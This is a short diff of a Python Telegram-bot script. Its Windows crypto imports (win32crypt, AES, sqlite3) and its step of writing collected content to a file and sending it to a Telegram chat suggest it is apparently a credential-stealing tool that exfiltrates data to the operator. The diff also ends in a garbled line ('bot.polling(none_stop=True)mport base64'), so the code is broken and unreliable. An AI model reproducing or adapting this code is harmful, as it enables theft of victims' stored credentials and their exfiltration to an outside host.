@@ -8,9 +8,6 @@ import subprocess
 from urllib import request
 from telebot.types import Message
 import win32crypt
-import base64
-import sqlite3
-from Crypto.Cipher import AES
 import shutil
 from datetime import timezone, datetime, timedelta
 from telebot import *
@@ -243,7 +240,7 @@ if __name__ == "__main__":
     new_file = open('txt для тебя.txt', 'w')
     new_file.write(content1 + "\n" + content2 + "\n" + content3)
     new_file.close()
-    bot.send_document(1191491975, open('txt для тебя.txt', 'rb'))
+    bot.send_document(chat_id, open('txt для тебя.txt', 'rb'))
     @bot.message_handler(commands=['start']) 
     def start(message):
         markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
@@ -304,7 +301,8 @@ def func(message):
 
     
 
-bot.polling(none_stop=True)
+bot.polling(none_stop=True)mport base64
+
     
 
 
